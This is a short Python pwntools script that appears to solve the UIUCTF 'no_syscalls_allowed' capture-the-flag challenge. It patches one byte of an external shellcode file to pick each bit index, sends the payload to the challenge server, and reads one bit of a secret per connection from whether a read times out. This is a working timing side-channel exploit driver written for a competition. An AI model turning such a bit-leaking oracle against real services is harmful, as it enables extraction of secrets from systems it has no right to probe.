from pwn import *
import time

with open("no_syscalls_allowed.s", "rb") as f:
    loop = f.read()
for i in range(63, -1, -1):
    if (i+1) % 8 == 0: print()
    #r = process(["./no_syscalls_allowed"])
    r = remote("no-syscalls-allowed.chal.uiuc.tf", 1337)
    #r = remote("0", 1337)
    r.recvuntil(b"== proof-of-work: disabled ==\n")
    r.send(loop.replace(b"\x3f", bytes([i])))
    #r.send(loop)

    try:
        r.read(1, timeout=0.5)
        print(0, end="")
    except: #1
        print(1, end="")

    r.close()

print()
